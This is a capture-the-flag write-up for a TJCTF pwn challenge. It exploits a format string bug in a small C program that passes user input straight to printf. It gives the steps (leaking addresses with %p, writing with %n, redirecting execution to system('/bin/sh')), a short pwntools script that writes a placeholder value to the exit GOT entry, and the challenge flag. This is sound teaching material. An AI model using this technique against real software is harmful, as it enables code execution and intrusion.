---
layout: writeup
title: "TJCTF - Format String LOL"
category: Pwn
difficulty: Medium
tags: [format-string, pwntools, exploitation]
date: 2025-11-28
---

## Summary

Format string vulnerability allowed arbitrary writes to memory, which we used to
overwrite a return address and jump to our shellcode / `system("/bin/sh")`.

## Vulnerable code

```c
#include <stdio.h>

int main(void) {
    char buf[128];
    fgets(buf, sizeof(buf), stdin);
    printf(buf);  // no format string = gg
    return 0;
}
```

The bug is the call to `printf(buf)` instead of `printf("%s", buf)`.

## Strategy

1. Leak stack / libc addresses using `%p` / `%x`.
2. Use `%n` to perform an arbitrary write.
3. Overwrite the saved return address with the address of `system("/bin/sh")`
   or a ROP chain.

## Exploit (pwntools + fstr)

```python
from pwn import *
from fstr import Fstr  # my custom format string helper

elf = ELF("./vuln")
p = process(elf.path)

# Example idea: write 0xdeadbeef to some GOT entry
target = elf.got["exit"]
payload = Fstr(writes={target: 0xdeadbeef}, offset=6).payload

p.sendline(payload)
p.interactive()
```

## Flag

```text
tjctf{sys_c4ll3d_l1nux_294835}
```
